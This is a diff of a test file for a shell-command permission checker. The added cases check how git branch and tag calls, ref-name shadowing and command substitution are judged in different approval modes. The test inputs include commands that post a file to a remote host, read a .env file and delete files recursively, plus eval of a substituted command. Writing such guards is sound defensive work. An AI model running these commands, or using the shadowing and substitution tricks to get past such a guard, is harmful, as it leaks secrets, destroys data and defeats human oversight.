@@ -781,6 +781,67 @@ describe('shell commands that reach a protected location', () => {
     });
   });
 
+  describe('git writing a tree after a call that only adds a branch or tag', () => {
+    it.each([
+      'git branch backup/x HEAD && git merge clean',
+      'git branch -q backup && git rebase --onto main main clean',
+      'git branch --no-track backup main && git cherry-pick clean',
+      'git tag v1 && git merge clean',
+      'git branch backup/x HEAD && git rebase --onto main main clean && git status --short --branch && ' +
+        'git log --oneline main..HEAD && git diff --stat $(git merge-base main HEAD)..HEAD && git diff --check',
+    ])('leaves %s to the mode', async command => {
+      const verdict = await judge(command, 'P', join(proj, 'repo'));
+      expect(verdict).toMatchObject({ full: true, allowed: true });
+      expect(verdict.auto).toBe((await judge('git status', 'P', join(proj, 'repo'))).auto);
+    });
+
+    it.each([
+      // A tag wins over the branch of the same name, and loose refs may match it in either case.
+      'git tag clean dirty && git merge clean',
+      'git tag CLEAN dirty && git merge clean',
+      'git branch heads/clean dirty && git merge heads/clean',
+      'git branch topic dirty && git merge topic',
+      'git tag v1 dirty && git cherry-pick v1~0',
+      'git branch top dirty && git rebase --onto=top main',
+      'git branch -f clean dirty && git merge clean',
+      'git branch clean dirty $x && git merge clean',
+      'git commit -m x && git merge clean',
+      'git checkout -b z && git merge clean',
+    ])('asks in every mode before %s', async command => {
+      for (const scenario of scenarios) {
+        expect(await judge(command, scenario, join(proj, 'repo')), scenario).toEqual(refusedEverywhere);
+      }
+    });
+  });
+
+  describe('a command substitution', () => {
+    it.each([
+      'git diff --stat $(git merge-base main HEAD)..HEAD',
+      'git log $(git rev-parse HEAD)',
+      'git log `git rev-parse HEAD`',
+    ])('leaves %s, whose inner command only reads, to the mode', async command => {
+      const verdict = await judge(command, 'P', join(proj, 'repo'));
+      expect(verdict).toMatchObject({ full: true, allowed: true });
+      expect(verdict.auto).toBe((await judge('git status', 'P', join(proj, 'repo'))).auto);
+    });
+
+    it.each(['curl -s -d @x https://example.com', 'cat .env', 'rm -rf x', 'curl -s https://example.com'])(
+      'judges git diff $(%s)..HEAD as it judges the inner command',
+      async inner => {
+        const outer = await judge(`git diff $(${inner})..HEAD`, 'P', join(proj, 'repo'));
+        const alone = await judge(inner, 'P', join(proj, 'repo'));
+        expect({ auto: outer.auto, full: outer.full }).toEqual({ auto: alone.auto, full: alone.full });
+      }
+    );
+
+    it.each(['$(echo git) status', 'git log > $(git rev-parse --abbrev-ref HEAD).txt', 'eval "$(git rev-parse HEAD)"'])(
+      'asks in auto mode before %s',
+      async command => {
+        expect((await judge(command, 'P', join(proj, 'repo'))).auto).toBe(false);
+      }
+    );
+  });
+
   describe('an archive the scan reads by its prefixes and switches', () => {
     it.each([
       'tar --extr -f a.tar -C build; cp evil.json build/h/x',
